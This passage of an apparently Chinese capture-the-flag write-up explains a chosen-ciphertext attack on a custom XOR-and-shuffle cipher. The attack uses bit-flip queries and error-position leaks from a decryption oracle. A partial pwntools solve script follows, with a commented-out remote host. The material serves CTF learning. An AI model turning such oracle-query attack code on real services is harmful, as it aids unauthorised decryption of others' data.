+&#x89E3;&#x5BC6;&#x903B;&#x8F91;&#x91CC;&#x5934;&#x6709;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x5FC5;&#x987B;&#x662F;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x89E3;&#x5BC6;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x957F;&#x5EA6;&#x3001;&#x4E24;&#x4E2A; token &#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#x548C; flag &#x7684;&#x543B;&#x5408;&#x3002;&#x6CE8;&#x610F;&#x5230;&#x662F;&#x5148;&#x5224;&#x7B2C;&#x4E00;&#x4E2A;&#x518D;&#x5224;&#x7B2C;&#x4E8C;&#x4E2A;&#x3002;&#x540C;&#x65F6;&#x5BF9;&#x4E8E;&#x7B2C;&#x4E00;&#x4E2A;&#x9650;&#x5236;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x5148;&#x5728;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x51FA;&#x73B0;&#x975E;&#x6CD5;&#x5B57;&#x7B26;&#x3002;</p>
+<p>&#x6574;&#x4E2A;&#x52A0;&#x5BC6;&#x6D41;&#x7A0B;&#x5206;&#x4E3A;&#x4E09;&#x90E8;&#x5206;&#xFF1A;</p>
+<ul>
+<li>&#x4EE5; secret1+token1 &#x4E3A;&#x79CD;&#x5B50;&#x751F;&#x6210;&#x6BD4;&#x7279;&#x4E32; r&#xFF0C;&#x5C06;&#x539F;&#x59CB;&#x4FE1;&#x606F;&#x5F02;&#x6216;&#x4E0A; r&#x3002;</li>
+<li>&#x4ECD;&#x7528;&#x4E0A;&#x6B21;&#x7684;&#x968F;&#x673A;&#x6570;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;&#x5B57;&#x8282;&#x4E2D;&#xFF0C;&#x5185;&#x90E8;&#x6BD4;&#x7279;&#x8FDB;&#x884C; shuffle &#x6253;&#x4E71;&#x3002;&#x540C;&#x65F6;&#x5C06; token1 &#x62FC;&#x63A5;&#x5230;&#x4E32;&#x672B;&#x5C3E;&#x3002;</li>
+<li>&#x4EE5; secret2+token2 &#x4E3A;&#x79CD;&#x5B50;&#xFF0C;&#x505A;&#x4EE5;&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;&#x7684; shuffle &#x6253;&#x4E71;&#x3002;&#x5C06; token2 &#x62FC;&#x63A5;&#x5230;&#x672B;&#x5C3E;&#x3002;</li>
+</ul>
+<p>&#x6CE8;&#x610F;&#x5230;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x83B7;&#x5F97;&#x4EFB;&#x610F;&#x5173;&#x4E8E; secret &#x7684;&#x4FE1;&#x606F;&#x3002;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5C06;&#x8FD9;&#x6574;&#x4F53;&#x89C6;&#x4E3A;&#x4E00;&#x4E2A; random oracle&#x3002;&#x5373;&#x82E5;&#x6211;&#x4EEC;&#x8981;&#x83B7;&#x77E5;&#x5173;&#x4E8E;&#x8FD9;&#x4E24;&#x4E2A;&#x968F;&#x673A;&#x6570;&#x751F;&#x6210;&#x5668;&#x7684;&#x4EFB;&#x610F;&#x4FE1;&#x606F;&#xFF0C;&#x5FC5;&#x987B;&#x76F4;&#x63A5;&#x4EE5; token1 &#x6216;&#x8005; token2 &#x4E3A;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8BE2;&#x95EE;&#x3002;&#x8FD9;&#x4E5F;&#x8BF4;&#x660E;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x76F4;&#x63A5;&#x83B7;&#x5F97;&#x660E;&#x6587;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E0E; flag &#x4E0D;&#x540C;&#x7684;&#x4E32;&#x3002;</p>
+<p>&#x8003;&#x8651;&#x5206;&#x6B65;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF1A;&#x5148;&#x8003;&#x8651;&#x5BF9;&#x4E8E;&#x4EFB;&#x610F;&#x7ED9;&#x5B9A;&#x5BC6;&#x6587;&#x4E32;&#xFF0C;&#x5982;&#x4F55;&#x64A4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x3002;</p>
+<p>&#x5BF9;&#x4E8E;&#x4EFB;&#x610F;&#x660E;&#x6587;&#x52A0;&#x5BC6;&#x5F97;&#x5230;&#x7684;&#x4E32;&#xFF0C;&#x5176;&#x4E0D;&#x53D7; flag &#x6761;&#x4EF6;&#x9650;&#x5236;&#x7684;&#x5F71;&#x54CD;&#x3002;&#x800C;&#x660E;&#x6587;&#x4E2D;&#x67D0;&#x4E2A;&#x6BD4;&#x7279;&#x7FFB;&#x8F6C;&#xFF0C;&#x5BC6;&#x6587;&#x4E2D;&#x4E5F;&#x4E00;&#x5B9A;&#x6709;&#x4E00;&#x4E2A;&#x5BF9;&#x5E94;&#x6BD4;&#x7279;&#x7FFB;&#x8F6C;&#x3002;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6027;&#x8D28;&#xFF0C;&#x5BF9;&#x5BC6;&#x6587;&#x9010;&#x6BD4;&#x7279;&#x505A;&#x5DEE;&#x5206;&#x7FFB;&#x8F6C;&#x5373;&#x53EF;&#x5F97;&#x5230;&#x660E;&#x6587;&#x5BF9;&#x5E94;&#x6BD4;&#x7279;&#x4F4D;&#xFF08;&#x5982;&#x679C;&#x7FFB;&#x8F6C;&#x540E;&#x660E;&#x6587;&#x4E0D;&#x5408;&#x6CD5;&#x6216;&#x8005;&#x7FFB;&#x8F6C;&#x7684;&#x6BD4;&#x7279;&#x8FC7;&#x591A;&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x7FFB;&#x8F6C;&#x5230;&#x4E86; token1 &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x660E;&#x6587;&#xFF09;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x64A4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B65;&#xFF08;&#x4F46;&#x4E0D;&#x80FD;&#x5B8C;&#x5168;&#x786E;&#x5B9A; token1&#xFF09;&#x548C;&#x5012;&#x6570;&#x7B2C;&#x4E8C;&#x6B65;&#x3002;&#x6709;&#x4E00;&#x4E2A;&#x5C0F;&#x6280;&#x5DE7;&#x662F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; ascii &#x4E3A; 97 &#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x8FD9;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x7FFB;&#x8F6C;&#x9664;&#x4E86;&#x9AD8;&#x4F4D;&#x4EE5;&#x5916;&#x7684;&#x4EFB;&#x610F;&#x4E00;&#x4F4D;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x662F;&#x5408;&#x6CD5;&#x7684;&#xFF0C;&#x5373;&#x4EFB;&#x610F;&#x7FFB;&#x8F6C;&#x90FD;&#x80FD;&#x5F97;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x4F4D;&#x3002;</p>
+<p>&#x5BF9;&#x4E8E; flag &#x52A0;&#x5BC6;&#x5F97;&#x5230;&#x7684;&#x4E32;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x7FFB;&#x8F6C;&#x4E86;&#x660E;&#x6587;&#x67D0;&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x6700;&#x9AD8;&#x4F4D;&#xFF0C;&#x5219;&#x4F1A;&#x89E6;&#x53D1;&#x7B2C;&#x4E00;&#x4E2A;&#x9650;&#x5236;&#x800C;&#x4E0D;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x3002;&#x540C;&#x65F6;&#x5229;&#x7528;&#x8FD4;&#x56DE;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x5BF9;&#x5E94;&#x7684;&#x539F;&#x59CB;&#x4F4D;&#x7F6E;&#x3002;&#x518D;&#x7ED3;&#x5408;&#x4E00;&#x4E9B;&#x989D;&#x5916;&#x7684;&#x6761;&#x4EF6;&#x4E5F;&#x53EF;&#x4EE5;&#x7B5B;&#x9009;&#x51FA; token1 &#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#x8FD9;&#x5C31;&#x53EF;&#x4EE5;&#x64A4;&#x56DE;&#x7B2C;&#x4E8C;&#x6B65;&#x4E86;&#x3002;</p>
+<p>&#x4E4B;&#x540E;&#x518D;&#x8003;&#x8651;&#x5982;&#x4F55;&#x64A4;&#x56DE; flag &#x7684;&#x524D;&#x4E24;&#x6B65;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x80FD;&#x83B7;&#x5F97; secret1+token1 &#x6784;&#x9020;&#x7684;&#x968F;&#x673A;&#x6570;&#x751F;&#x6210;&#x5668;&#x7684;&#x539F;&#x59CB;&#x72B6;&#x6001;&#xFF0C;&#x5219;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD8;&#x539F;&#x524D;&#x4E24;&#x6B65;&#x3002;&#x6CE8;&#x610F;&#x5230;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x80FD;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x8BE5;&#x751F;&#x6210;&#x5668;&#x8DB3;&#x591F;&#x957F;&#x7684; randombits&#xFF0C;&#x7ED3;&#x5408;&#x6E90;&#x4EE3;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x77E5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x4FE1;&#x606F;&#x6765;&#x8FD8;&#x539F;&#x524D;&#x4E24;&#x6B65;&#xFF08;&#x867D;&#x7136;&#x7EC6;&#x8282;&#x6709;&#x4E00;&#x70B9;&#x70B9;&#x591A;&#xFF09;&#x3002;&#x800C;&#x5982;&#x679C;&#x660E;&#x6587;&#x7684;&#x6BD4;&#x7279;&#x957F;&#x5EA6;&#x4E3A; n&#xFF0C;&#x5219;&#x6211;&#x4EEC;&#x5927;&#x7EA6;&#x9700;&#x8981; 6n &#x4E2A;&#x5B57;&#x8282;&#x7684; randombits&#x3002;</p>
+<p>&#x501F;&#x52A9;&#x4E4B;&#x524D;&#x7684;&#x64A4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x505A;&#x5230; token1 &#x7684;&#x4EFB;&#x610F;&#x66FF;&#x6362;&#x3002;&#x9664;&#x4E86;&#x4E0D;&#x80FD;&#x786E;&#x5B9A; token1 &#x4E2D; 4 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5177;&#x4F53;&#x987A;&#x5E8F;&#x3002;</p>
+<p>&#x5177;&#x4F53;&#x5730;&#xFF0C;&#x5148;&#x6784;&#x9020;&#x4E00;&#x4E2A; 6n &#x5B57;&#x8282;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x5F97;&#x5230;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x4E0A;&#x8FF0;&#x65B9;&#x6CD5;&#x5F97;&#x5230;&#x7B2C;&#x4E8C;&#x6B21; shuffle &#x7684;&#x987A;&#x5E8F;&#x3002;&#x4FEE;&#x6539;&#x8BE5;&#x8F93;&#x51FA;&#x7684; token1 &#x4E3A; flag &#x7684; token1&#xFF08;&#x8981;&#x5148;&#x679A;&#x4E3E;&#x5168;&#x6392;&#x5217;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;&#x518D;&#x91CD;&#x505A;&#x7B2C;&#x4E09;&#x6B65;&#x3002;&#x5C06;&#x7ED3;&#x679C;&#x8F93;&#x5165;&#x5230;&#x89E3;&#x5BC6;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E; token1 &#x7684;&#x66FF;&#x6362;&#xFF0C;&#x660E;&#x6587;&#x6240;&#x6709;&#x4F4D;&#x7F6E;&#x90FD;&#x88AB;&#x6539;&#x53D8;&#x4E86;&#xFF0C;&#x4E5F;&#x4F1A;&#x51FA;&#x73B0;&#x975E;&#x6CD5;&#x5B57;&#x7B26;&#x3002;&#x4F46;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x539F;&#x59CB;&#x7684;&#x5B57;&#x7B26; shuffle &#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x6839;&#x636E;&#x975E;&#x6CD5;&#x5B57;&#x7B26;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5C06;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x66FF;&#x6362;&#x6210;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x5373;&#x53EF;&#x6D88;&#x53BB;&#x8FD9;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x3002;&#x7B80;&#x5355;&#x9010;&#x5B57;&#x8282;&#x626B;&#x63CF;&#x4E00;&#x904D;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5408;&#x6CD5;&#x8F93;&#x51FA;&#x7684;&#x660E;&#x6587;&#x4E32;&#x4E86;&#x3002;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x9010;&#x6BD4;&#x7279;&#x626B;&#x63CF;&#xFF0C;&#x8FDB;&#x884C;&#x5DEE;&#x5206;&#x7FFB;&#x8F6C;&#xFF0C;&#x5C06;&#x660E;&#x6587;&#x6784;&#x9020;&#x6210;&#x5168; 97 &#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x6BD4;&#x7279;&#x7EA7;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;&#x3002;&#x5219;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x64A4;&#x56DE;&#x4EE5; flag &#x7684; token1 &#x4E3A;&#x968F;&#x673A;&#x6570;&#x53C2;&#x6570;&#x7684;&#x5BC6;&#x6587;&#x7684;&#x540E;&#x4E24;&#x6B65;&#x4E86;&#x3002;&#x800C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x660E;&#x6587;&#x4E3A;&#x5168; 97&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x6B65;&#x5F02;&#x6216;&#x6240;&#x751F;&#x6210;&#x7684;&#x6BD4;&#x7279;&#x4E32;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x518D;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6BD4;&#x7279;&#x4E32;&#xFF0C;&#x5373;&#x53EF;&#x8FD8;&#x539F;&#x52A0;&#x5BC6; flag1 &#x65F6;&#x7684;&#x7B2C;&#x4E00;&#x6B65;&#x548C;&#x7B2C;&#x4E8C;&#x6B65;&#x3002;&#x9A8C;&#x8BC1;&#x6B64;&#x65F6;&#x5F97;&#x5230;&#x7684;&#x660E;&#x6587;&#x662F;&#x5426;&#x5408;&#x6CD5;&#x5373;&#x53EF;&#x3002;
+&#x6B64;&#x5904;&#x6709;&#x4E00;&#x4E2A;&#x5C0F;&#x4F18;&#x5316;&#xFF1A;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x89E3;&#x6790;&#x8BE5;&#x4E32;&#x957F;&#x7684;&#x4E00;&#x5C0F;&#x90E8;&#x5206;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x660E;&#x6587;&#x7684;&#x524D;&#x9762;&#x4E00;&#x5C0F;&#x90E8;&#x5206;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x65F6;&#x5C31;&#x5224;&#x65AD;&#x660E;&#x6587;&#x662F;&#x5426;&#x5408;&#x6CD5;&#xFF0C;&#x8FDB;&#x800C;&#x51B3;&#x5B9A;&#x4E2D;&#x65AD;&#x5E76;&#x7EE7;&#x7EED;&#x4E0B;&#x4E00;&#x4E2A;&#x6392;&#x5217;&#x8FD8;&#x662F;&#x7EE7;&#x7EED;&#x3002;&#x8FD9;&#x53EF;&#x4EE5;&#x5927;&#x5E45;&#x51CF;&#x5C11;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x662F;&#x5185;&#x7F51;&#x5F00;&#x673A;&#x5B50;&#x8DD1;&#x5F97;&#x5FEB;&#xFF0C;&#x56E0;&#x6B64;&#x8BE5;&#x4F18;&#x5316;&#x5E76;&#x6CA1;&#x6709;&#x5199;&#x5B8C;&#x3002;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Process
+<span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> xor
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> secrets
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+<span class="hljs-keyword">import</span> itertools
+
+<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *
+
+<span class="hljs-keyword">import</span> bitarray
+<span class="hljs-keyword">from</span> bitarray.util <span class="hljs-keyword">import</span> ba2hex, hex2ba, ba2base, base2ba
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+
+<span class="hljs-comment"># ========================================================================</span>
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvalidChar</span><span class="hljs-params">(Exception)</span>:</span>
+    <span class="hljs-keyword">pass</span>
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DangerousToken</span><span class="hljs-params">(Exception)</span>:</span>
+    <span class="hljs-keyword">pass</span>
+
+
+valid_char = [ord(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.digits +
+              string.ascii_letters + string.punctuation]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_valid</span><span class="hljs-params">(s: bytes)</span>:</span>
+    r = list(map(<span class="hljs-keyword">lambda</span> x: x <span class="hljs-keyword">in</span> valid_char, s))
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">False</span> <span class="hljs-keyword">in</span> r:
+        <span class="hljs-keyword">raise</span> InvalidChar(r.index(<span class="hljs-keyword">False</span>))
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getrandbits</span><span class="hljs-params">(token: bytes, k: int)</span> -&gt; int:</span>
+    random.seed(token)
+    <span class="hljs-keyword">return</span> random.getrandbits(k)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytes_xor_int</span><span class="hljs-params">(s: bytes, r: int, length: int)</span> -&gt; bytes:</span>
+    s = int.from_bytes(s, <span class="hljs-string">&apos;little&apos;</span>)
+    <span class="hljs-keyword">return</span> (s ^ r).to_bytes(length, <span class="hljs-string">&apos;little&apos;</span>)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__byte_shuffle</span><span class="hljs-params">(s: int)</span> -&gt; int:</span>
+    bits = list(bin(s)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>))
+    random.shuffle(bits)
+    <span class="hljs-keyword">return</span> int(<span class="hljs-string">&apos;&apos;</span>.join(bits), <span class="hljs-number">2</span>)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__byte_shuffle_re</span><span class="hljs-params">(s: int)</span> -&gt; int:</span>
+    s = bin(s)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)
+    idx = list(range(<span class="hljs-number">8</span>))
+    random.shuffle(idx)
+    s = <span class="hljs-string">&apos;&apos;</span>.join([s[idx.index(i)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>)])
+    <span class="hljs-keyword">return</span> int(s, <span class="hljs-number">2</span>)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_shuffle</span><span class="hljs-params">(s: bytes)</span> -&gt; bytes:</span>
+    s = bytearray(s)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):
+        s[i] = __byte_shuffle(s[i])
+    <span class="hljs-keyword">return</span> bytes(s)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_shuffle_re</span><span class="hljs-params">(s: bytes)</span> -&gt; bytes:</span>
+    s = bytearray(s)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):
+        s[i] = __byte_shuffle_re(s[i])
+    <span class="hljs-keyword">return</span> bytes(s)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytes_shuffle</span><span class="hljs-params">(token: bytes, s: bytes)</span> -&gt; bytes:</span>
+    random.seed(token)
+    s = bytearray(s)
+    random.shuffle(s)
+    <span class="hljs-keyword">return</span> bytes(s)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytes_shuffle_re</span><span class="hljs-params">(token: bytes, s: bytes)</span> -&gt; bytes:</span>
+    random.seed(token)
+    idx = list(range(len(s)))
+    random.shuffle(idx)
+    r = bytearray(len(s))
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):
+        r[idx[i]] = s[i]
+    <span class="hljs-keyword">return</span> bytes(r)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(s: str, token=<span class="hljs-params">(None, None)</span>)</span>:</span>
+    <span class="hljs-keyword">if</span> token[<span class="hljs-number">0</span>] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">or</span> token[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+        token = (secrets.randbits(<span class="hljs-number">32</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;little&apos;</span>),
+                 secrets.randbits(<span class="hljs-number">32</span>).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;little&apos;</span>))
+    s: bytes = s.encode()
+
+    check_valid(s)
+
+    r = getrandbits(token[<span class="hljs-number">0</span>]+secret_1, <span class="hljs-number">8</span>*len(s))
+    s = bytes_xor_int(s, r, len(s))
+    s = bits_shuffle(s)
+    s += token[<span class="hljs-number">0</span>]
+
+    s = bytes_shuffle(token[<span class="hljs-number">1</span>]+secret_2, s)
+    s += token[<span class="hljs-number">1</span>]
+    s = s.hex()
+
+    <span class="hljs-keyword">return</span> s
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(s: str)</span>:</span>
+    s: bytes = bytes.fromhex(s)
+
+    s, token_1 = s[:<span class="hljs-number">-4</span>], s[<span class="hljs-number">-4</span>:]
+    s = bytes_shuffle_re(token_1+secret_2, s)
+
+    s, token_0 = s[:<span class="hljs-number">-4</span>], s[<span class="hljs-number">-4</span>:]
+    r = getrandbits(token_0+secret_1, <span class="hljs-number">8</span>*len(s))
+    s = bits_shuffle_re(s)
+    s = bytes_xor_int(s, r, len(s))
+
+    check_valid(s)
+
+    s = s.decode()
+    <span class="hljs-keyword">return</span> s
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_pow</span><span class="hljs-params">(ax,ts)</span>:</span>
+    cs=string.digits+string.ascii_letters
+    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> cs:
+        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> cs:
+            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cs:
+                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> cs:
+                    pg=a+b+c+d+ax
+                    hs=sha256(pg.encode()).hexdigest()
+                    <span class="hljs-keyword">if</span> hs==ts:
+                        <span class="hljs-keyword">return</span> a+b+c+d
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_pow</span><span class="hljs-params">()</span>:</span>
+    sh.recvuntil(<span class="hljs-string">b&quot;sha256(XXXX+&quot;</span>)
+    p1=sh.recvuntil(<span class="hljs-string">b&quot;)&quot;</span>,drop=<span class="hljs-keyword">True</span>).decode().strip()
+    sh.recvuntil(<span class="hljs-string">b&quot;==&quot;</span>)
+    p2=sh.recvline().decode().strip()
+    print(p1,p2)
+    jb=find_pow(p1,p2)
+    sh.sendline(jb.encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">diffpos</span><span class="hljs-params">(ag,bg)</span>:</span>
+    <span class="hljs-comment">#print(a,b)</span>
+    a=bitarray.bitarray()
+    b=bitarray.bitarray()
+    a.frombytes(ag.encode())
+    b.frombytes(bg.encode())
+    <span class="hljs-keyword">return</span> [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)) <span class="hljs-keyword">if</span> a[i]!=b[i]]
+
+sh=process(<span class="hljs-string">&quot;python3 ./main.py&quot;</span>,shell=<span class="hljs-keyword">True</span>)
+<span class="hljs-comment">#sh=remote(&quot;112.74.179.118&quot;,1)</span>
+<span class="hljs-comment">#do_pow()</span>
+<span class="hljs-comment">#sh.interactive()</span>
+
+sh.recvuntil(<span class="hljs-string">b&quot;flag:&quot;</span>)
+flagm=sh.recvline().decode().strip()
+print(flagm)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">querydecrypt</span><span class="hljs-params">(hx:str)</span>:</span>
+    sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+    sh.sendline(<span class="hljs-string">b&quot;1&quot;</span>)
+    sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+    sh.sendline(hx.encode())
+    res=sh.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>).decode()
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;invalid characters&apos;</span> <span class="hljs-keyword">in</span> res:
+        sh.recvuntil(<span class="hljs-string">b&quot;pos&quot;</span>)
+        pos=int(sh.recvline().decode().strip())
+        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>,pos)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;dangerous token&apos;</span> <span class="hljs-keyword">in</span> res:
+        <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span>,<span class="hljs-keyword">None</span>)
+    pmess=sh.recvline().decode().strip()
+    <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>,pmess)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getmid</span><span class="hljs-params">(tox)</span>:</span>
+    sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+    sh.sendline(<span class="hljs-string">b&quot;0&quot;</span>)
+    sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+    sh.sendline(tox)
+    sh.recvuntil(<span class="hljs-string">b&quot;message:&quot;</span>)
+    mess=sh.recvline().decode().strip()
+    print(mess)
+    print(len(mess)//<span class="hljs-number">2</span>,len(tox))
+
+    mlen=<span class="hljs-number">4</span>*len(mess)
+
+    xorder=[<span class="hljs-number">-1</span>]*len(tox)
+
+    i=<span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> i&lt;(mlen<span class="hljs-number">-8</span>*<span class="hljs-number">4</span>):
+        gm=hex2ba(mess)
+        gm[i]^=<span class="hljs-number">1</span>
+        gm=ba2hex(gm)
+        <span class="hljs-comment">#print(gm)</span>
+        sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+        sh.sendline(<span class="hljs-string">b&quot;1&quot;</span>)
+        sh.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
+        sh.sendline(gm.encode())
+        res=sh.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>).decode()
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;invalid&quot;</span> <span class="hljs-keyword">in</span> res:
+            print(<span class="hljs-string">&quot;fail&quot;</span>,i)
+            i+=<span class="hljs-number">1</span>
+            <span class="hljs-keyword">continue</span>
+        pmess=sh.recvline().decode().strip()
+        dp=diffpos(tox,pmess)
+        <span class="hljs-keyword">if</span> len(dp)!=<span class="hljs-number">1</span>:
+            print(<span class="hljs-string">&quot;fail&quot;</span>,i,dp)
+            i+=<span class="hljs-number">1</span>
+            <span class="hljs-keyword">continue</span>
+        dp=dp[<span class="hljs-number">0</span>]
+        print(<span class="hljs-string">&quot;hit&quot;</span>,i,dp)
+        xorder[dp//<span class="hljs-number">8</span>]=i//<span class="hljs-number">8</span>
+        i=(i+<span class="hljs-number">8</span>)//<span class="hljs-number">8</span>*<span class="hljs-number">8</span>
+        <span class="hljs-comment">#i+=1</span>
+
+    print(xorder)
+
+    midmesstx=bytes.fromhex(mess)
